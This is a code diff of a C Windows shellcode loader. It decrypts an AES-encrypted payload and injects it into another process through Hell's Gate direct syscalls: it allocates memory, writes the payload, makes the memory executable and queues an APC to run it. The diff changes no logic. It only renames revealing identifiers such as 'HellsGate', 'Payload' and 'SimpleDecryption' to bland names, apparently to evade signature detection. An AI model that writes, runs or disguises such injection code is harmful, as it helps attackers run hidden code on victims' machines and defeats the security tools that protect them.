@@ -4,7 +4,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <time.h>
-#include "hellshell.h"
+#include "shell.h"
 #include "structs.h"
 
 #pragma comment(lib, "winhttp.lib")
@@ -246,44 +246,44 @@ PTEB getRtlTeb();
 BOOL getExportDir(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDir);
 BOOL getittksjbfdsgdbkj(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDir, PSYS_TABLE_ENTRY pSysTableEntry);
 
-extern VOID HellsGate(WORD wSystemCall);
-extern HellDescent();
+extern VOID Gate(WORD wSystemCall);
+extern Descent();
 
-BOOL jasjkfdsgs(IN PSYS_TABLE pSysTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {
+BOOL jasjkfdsgs(IN PSYS_TABLE pSysTable, IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pthing, IN SIZE_T sthingSize) {
     NTSTATUS STATUS = 0x00;
     PVOID    pAddress = NULL;
     ULONG    uOldProtection = NULL;
-    SIZE_T   sSize = sPayloadSize, sBytesWritten = NULL;
+    SIZE_T   sSize = sthingSize, sBytesWritten = NULL;
 
-    HellsGate(pSysTable->NtAllocateVirtualMemory.wSystemCall);
-    if ((STATUS = HellDescent(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
+    Gate(pSysTable->NtAllocateVirtualMemory.wSystemCall);
+    if ((STATUS = Descent(hProcess, &pAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
         printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X\n", STATUS);
         return FALSE;
     }
     printf("[+] Allocated Address At: 0x%p Of Size: %d\n", pAddress, sSize);
 
-    printf("[#] Press <Enter> To Write The Payload...");
+    printf("[#] Press <Enter> To Write The thing...");
     getchar();
-    printf("\t[i] Writing Payload Of Size %d...", sPayloadSize);
-    HellsGate(pSysTable->NtWriteVirtualMemory.wSystemCall);
-    if ((STATUS = HellDescent(hProcess, pAddress, pPayload, sPayloadSize, &sBytesWritten)) != 0 || sBytesWritten != sPayloadSize) {
+    printf("\t[i] Writing thing Of Size %d...", sthingSize);
+    Gate(pSysTable->NtWriteVirtualMemory.wSystemCall);
+    if ((STATUS = Descent(hProcess, pAddress, pthing, sthingSize, &sBytesWritten)) != 0 || sBytesWritten != sthingSize) {
         printf("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X\n", STATUS);
-        printf("[i] Bytes Written: %d of %d\n", sBytesWritten, sPayloadSize);
+        printf("[i] Bytes Written: %d of %d\n", sBytesWritten, sthingSize);
         return FALSE;
     }
     printf("[+] DONE\n");
 
-    HellsGate(pSysTable->NtProtectVirtualMemory.wSystemCall);
-    if ((STATUS = HellDescent(hProcess, &pAddress, &sPayloadSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
+    Gate(pSysTable->NtProtectVirtualMemory.wSystemCall);
+    if ((STATUS = Descent(hProcess, &pAddress, &sthingSize, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
         printf("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X\n", STATUS);
         return FALSE;
     }
 
-    printf("[#] Press <Enter> To Run The Payload...");
+    printf("[#] Press <Enter> To Run The thing...");
     getchar();
-    printf("\t[i] Running Payload At 0x%p Using Thread Of Id: %d...", pAddress, GetThreadId(hThread));
-    HellsGate(pSysTable->NtQueueApcThread.wSystemCall);
-    if ((STATUS = HellDescent(hThread, pAddress, NULL, NULL, NULL)) != 0) {
+    printf("\t[i] Running thing At 0x%p Using Thread Of Id: %d...", pAddress, GetThreadId(hThread));
+    Gate(pSysTable->NtQueueApcThread.wSystemCall);
+    if ((STATUS = Descent(hThread, pAddress, NULL, NULL, NULL)) != 0) {
         printf("[!] NtQueueApcThread Failed With Error: 0x%0.8X\n", STATUS);
         return FALSE;
     }
@@ -509,7 +509,7 @@ int main(int argc, char** argv) {
             pDecryptedData = fileContent;
             sDecryptedData = fileSize;
 
-            printf("[+] Using raw payload of size: %zu bytes\n", sDecryptedData);
+            printf("[+] Using raw thing of size: %zu bytes\n", sDecryptedData);
         }
         else {
             extractVars(fileContent);
@@ -530,8 +530,8 @@ int main(int argc, char** argv) {
             printf("[+] AesKey: %s\n", AesKey->name);
             printf("[+] AesIv: %s\n", AesIv->name);
 
-            if (!SimpleDecryption(AesCipherText->data, AesCipherText->dataSize, AesKey->data, AesIv->data, &pDecryptedData, &sDecryptedData)) {
-                printf("[!] SimpleDecryption Failed\n");
+            if (!ProcessBuffer(AesCipherText->data, AesCipherText->dataSize, AesKey->data, AesIv->data, &pDecryptedData, &sDecryptedData)) {
+                printf("[!] ProcessBuffer Failed\n");
                 free(fileContent);
                 free(serverName);
                 free(filePath);
